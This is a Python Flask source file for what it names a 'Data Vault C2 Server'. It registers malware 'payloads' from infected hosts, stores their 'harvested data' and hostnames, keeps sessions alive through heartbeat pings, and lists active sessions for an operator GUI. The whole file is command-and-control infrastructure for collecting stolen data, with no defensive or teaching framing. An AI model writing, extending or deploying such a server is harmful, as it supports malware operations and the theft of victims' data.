from flask import Flask, request, jsonify
import time
import threading

# Use a dictionary to store session data in memory
SESSIONS = {}

app = Flask(__name__)

@app.route('/api/register', methods=['POST'])
def register():
    """
    Handles the initial registration of a new payload.
    Stores the harvested data.
    """
    data = request.json
    session_id = data.get("session_id")
    if session_id:
        print(f"[*] New session registered: {data.get('hostname')} ({session_id})")
        SESSIONS[session_id] = {
            "session_id": session_id,
            "hostname": data.get("hostname"),
            "data": data.get("data"),
            "last_seen": time.time()
        }
    return jsonify({"status": "ok"}), 200

@app.route('/api/heartbeat', methods=['POST'])
def heartbeat():
    """
    Handles heartbeat pings from active payloads to keep them alive.
    """
    data = request.json
    session_id = data.get("session_id")
    if session_id in SESSIONS:
        SESSIONS[session_id]["last_seen"] = time.time()
    return jsonify({"status": "ok"}), 200

@app.route('/api/get_sessions', methods=['GET'])
def get_sessions():
    """
    Endpoint for the GUI to fetch all active session data.
    """
    return jsonify(list(SESSIONS.values()))

def run_server():
    # Running on port 5002 to avoid conflicts with other potential modules
    app.run(host='0.0.0.0', port=5002)

if __name__ == '__main__':
    print("[*] Data Vault C2 Server starting...")
    run_server()